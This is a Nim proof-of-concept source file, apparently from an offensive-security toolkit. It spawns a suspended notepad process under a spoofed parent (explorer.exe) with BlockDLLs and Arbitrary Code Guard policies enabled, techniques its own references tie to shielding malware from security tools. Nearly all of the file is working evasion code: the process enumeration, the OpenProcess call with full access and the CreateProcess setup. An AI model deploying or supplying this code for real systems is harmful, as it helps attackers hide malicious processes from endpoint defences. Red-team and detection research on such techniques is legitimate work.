#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    Spawns notepad (suspended) with a spoofed PPID of explorer.exe, with BlockDLL and Arbitrary Code Guard protections enabled.

    References:
        - https://blog.xpnsec.com/protecting-your-malware/
        - https://gist.github.com/xpn/4eaacf7edda382cff8067866c4c7f1ce#file-blockdlls_poc-cpp
        - https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec
        - https://github.com/khchen/winim/blob/master/winim/inc/winbase.nim#L1458
        - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
]#


import winim
import strformat

const
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44 #Gr33tz to @_RastaMouse ;)
    PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process_name:
                pid = entry.th32ProcessID
                break

    return pid

var
    si: STARTUPINFOEX
    pi: PROCESS_INFORMATION
    ps: SECURITY_ATTRIBUTES
    ts: SECURITY_ATTRIBUTES
    policy: DWORD64
    lpSize: SIZE_T
    res: WINBOOL

si.StartupInfo.cb = sizeof(si).cint
ps.nLength = sizeof(ps).cint
ts.nLength = sizeof(ts).cint

InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE or PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON

res = UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
    addr policy,
    sizeof(policy),
    NULL,
    NULL
)

var processId = GetProcessByName("explorer.exe")
echo fmt"[*] Found PPID: {processId}"
var parentHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)

res = UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
    addr parentHandle,
    sizeof(parentHandle),
    NULL,
    NULL
)

res = CreateProcess(
    NULL,
    newWideCString(r"C:\Windows\notepad.exe"),
    ps,
    ts, 
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
    NULL,
    NULL,
    addr si.StartupInfo,
    addr pi
)

echo fmt"[+] Started process with PID: {pi.dwProcessId}"